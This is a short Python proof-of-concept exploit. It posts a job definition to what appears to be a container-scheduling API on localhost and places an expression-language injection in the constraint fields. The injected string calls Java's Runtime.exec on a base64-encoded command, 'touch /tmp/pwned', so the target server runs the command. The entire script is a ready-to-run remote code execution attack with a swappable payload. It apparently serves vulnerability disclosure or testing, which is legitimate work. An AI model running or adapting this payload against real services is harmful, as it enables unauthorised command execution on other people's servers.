import requests
from string import Template
payload = """{
    "applicationName": "localtest",
    "owner": {"teamEmail": "me@me.com"},
    "container": {
      "image": {"name": "alpine", "tag": "latest"},
      "entryPoint": ["/bin/sleep", "1h"],
      "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
      "softConstraints": {"constraints": {"${injection}":"True"}},
      "hardConstraints": {"constraints": {"${injection}": "False"}},
    },
    "batch": {
      "size": 1,
      "runtimeLimitSec": "3600",
      "retryPolicy":{"delayed": {"delayMs": "1000", "retries": 3}}
    }
  }
"""
t = Template(payload)

headers = {'Content-type': 'application/json'}

data = t.substitute(injection="#{#this.class.name.substring(0,5) == 'com.g' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA=='))).class.name}")

r = requests.post(url="http://localhost:7001/api/v3/jobs", headers=headers, data=data)

print r.text
